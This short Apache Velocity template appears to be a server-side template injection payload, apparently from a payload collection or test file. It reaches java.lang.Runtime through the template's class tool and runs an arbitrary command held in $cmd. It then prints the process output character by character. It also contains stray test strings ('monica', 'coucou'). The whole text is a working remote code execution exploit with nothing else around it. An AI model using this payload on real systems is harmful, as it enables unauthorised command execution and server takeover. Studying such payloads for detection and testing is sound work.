#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec($cmd))
$ex.waitFor()
#set($out=$ex.getInputStream())
#set( $monkey = 'monica' )
$monkey
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
"coucou"
